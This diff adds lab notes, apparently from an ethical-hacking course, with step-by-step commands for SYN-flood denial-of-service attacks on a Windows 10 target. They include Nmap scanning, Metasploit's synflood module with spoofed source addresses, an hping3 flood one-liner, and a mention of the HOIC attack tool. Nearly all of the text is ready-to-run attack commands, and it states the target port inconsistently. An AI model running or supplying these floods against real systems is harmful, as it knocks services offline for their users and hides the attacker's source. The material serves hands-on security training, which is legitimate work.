@@ -1,0 +1,34 @@
+
+--------------------Metsploit msfconsole to be used for DOS ---------------------------------------
+Log into the Kali Linux and open a new terminal window.
+We are going to perform SYN flooding on Windows 10 through some open port. To check what port is open or not, we will use Nmap to scan all open ports.
+
+> nmap -p- <Target IP address>
+we will use an auxiliary module from Metasploit named synflood to perform DoS attack on the target using port 44
+
+Type msfconsole to launch Metasploit Framework.
+>msfconsole
+
+Type the command to load the module:
+>use auxiliary/dos/tcp/synflood
+
+To display all the options of the module, type:
+>options
+>set RHOST [IP address of Target]
+>set RPORT 445
+>set SHOST [IP address of Spoofed machine]
+
+~~Switch to the Target machine and launch the Wireshark, select the corret interface and click start to check the attack
+> Also go to task manager and check the CPU to understand the impact.
+-----------------------------------------END----------------------------------------------
+
+--------------------hping3 to be used for DOS :: Perform SYN flooding using hping3---------------------------------------
+Log into the Kali Linux
+
+>hping3 -S [Target IP address] -a [Spoofed address] -p 22 --flood
+
+~~Switch to the Target machine and launch the Wireshark, select the corret interface and click start to check the attack
+> Also go to task manager and check the CPU to understand the impact.
+-----------------------------------------END-----------------------------------------------------------
+High Orbit Ion Cannon (HOIC) -- Can be used in Windows to carry out DOS
+Anti_DDoS_Guardian -- Can be used to detect the DOS
